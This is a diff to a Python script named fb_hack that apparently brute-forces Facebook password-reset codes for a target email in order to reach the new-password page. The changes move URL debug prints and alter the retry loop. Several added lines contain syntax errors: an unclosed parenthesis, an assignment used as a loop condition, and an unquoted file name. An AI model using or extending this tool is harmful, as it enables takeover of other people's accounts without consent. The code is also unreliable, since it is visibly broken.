@@ -136,7 +136,6 @@ def fb_hack(email, codex):
   check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-  print(browser.geturl())
   if check1 != test:
     if int(codex) > 999999:
       reset = int(codex) - 99000000
@@ -169,6 +168,7 @@ def fb_hack(email, codex):
         soup = BeautifulSoup(response1, 'html.parser')
         if soup.find(string="password_new") == test:
           print("Password not found")
+          print(browser.geturl())
           browser.close()
         else:
           print(s.join(success))
@@ -200,11 +200,11 @@ def fb_hack(email, codex):
         soup = BeautifulSoup(response1, 'html.parser')
         if soup.find(string="password_new") == test:
           print("Password not found")
+          print(browser.geturl()
           browser.close()
         else:
           print(s.join(success))
   else:
-    print(browser.geturl())
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     if soup.find(string="password_new") == test:
@@ -227,8 +227,8 @@ f.write(ehack)
 f.close()
 z.write(str(reset1))
 z.close()
-
-while True:
+starting = 1
+while starting = 1:
   try:
     fb_hack(ehack, reset)
     reset = reset1
@@ -244,5 +244,6 @@ while True:
     with open(passcoder.txt, "r") as f:
       reset = int(z.readlines(-1))
       z.close()
-      
+    print("Restarting")
+    sleepy(30)
     
